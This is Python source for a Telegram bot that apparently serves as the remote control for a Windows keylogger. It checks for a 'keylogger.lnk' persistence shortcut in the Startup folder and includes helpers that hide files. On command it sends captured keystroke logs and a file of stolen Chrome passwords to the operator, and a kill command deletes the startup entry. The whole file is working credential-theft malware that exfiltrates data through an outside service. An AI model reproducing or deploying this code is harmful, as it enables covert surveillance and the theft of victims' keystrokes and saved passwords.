  
from telethon import TelegramClient
from telethon import events
import os
from dotenv import load_dotenv
import subprocess


load_dotenv()


def is_file_in_startup_folder(file_path):
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Check if the file exists in the startup folder
    return os.path.isfile(os.path.join(startup_folder, file_path))

file_keylogger_path = "keylogger.lnk"
if is_file_in_startup_folder(file_keylogger_path):
    telegram_session_path = 'Keylogger.session'
else:
    telegram_session_path = '.\\config\\Keylogger.session'


flag = True
while flag:
    try:
        client = TelegramClient(telegram_session_path, os.getenv('API_ID'), os.getenv('API_HASH')).start(bot_token=os.getenv('BOT_TOKEN'))
        flag = False
    except Exception as e:
        # print("Exception: " + str(e.with_traceback))
        continue

def hide_a_file(filename):
    subprocess.run(["attrib","+H",filename],check=True)


def unhide_a_file(filename):
    subprocess.run(["attrib","-H",filename],check=True)

    
@events.register(events.NewMessage(pattern="/get_id"))
async def getid(event):
    """Send a message when the command /translate is issued."""
    print("User requests get_id - " + str(event.message.sender_id))
    chat = await event.get_chat()
    sender = await event.get_sender()
    chat_id = event.chat_id
    sender_id = event.sender_id
    await event.reply("Hi user " + str(event.message.sender_id))
    
@events.register(events.NewMessage(pattern="/get_log_text"))
async def get_log_text(event):
    if is_file_in_startup_folder(file_keylogger_path):
        file_path = "log_text.txt"
    else:
        file_path = ".\\config\\log_text.txt"

    if(os.stat(file_path).st_size == 0):
        await event.reply("Log text file is empty")
    else:
        await event.reply(file=file_path)
        
@events.register(events.NewMessage(pattern="/get_full_log"))
async def get_full_log(event):
    if is_file_in_startup_folder(file_keylogger_path):
        file_path = "full_log.txt"
    else:
        file_path = ".\\config\\full_log.txt"

    if(os.stat(file_path).st_size == 0):
        await event.reply("Full log file is empty")
    else:
        await event.reply(file=file_path)        

@events.register(events.NewMessage(pattern="/kill"))
async def kill_session(event):
    try:
        if is_file_in_startup_folder(file_keylogger_path):
            keylogger_start_up_file_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup","keylogger.lnk")
            file_path = ".env"
            os.remove(keylogger_start_up_file_path)
        else:
            file_path = ".\\config\\.env"

        os.remove(file_path)
        await event.reply("Kill process successfully.")
    except Exception as e:
        await event.reply("Kill process failed.")

@events.register(events.NewMessage(pattern="/get_chrome_pass"))
async def get_chrome_pass(event):
    try:
        if is_file_in_startup_folder(file_keylogger_path):
            file_path = "Chrome_pass.txt"
        else:
            file_path = ".\\config\\Chrome_pass.txt"


        await event.reply(file=file_path)
    except Exception as e:
        await event.reply("Cannot send Chrome pass file")

with client:
    client.add_event_handler(getid)
    client.add_event_handler(get_log_text)
    client.add_event_handler(get_full_log)
    client.add_event_handler(kill_session)
    client.add_event_handler(get_chrome_pass)
    client.run_until_disconnected()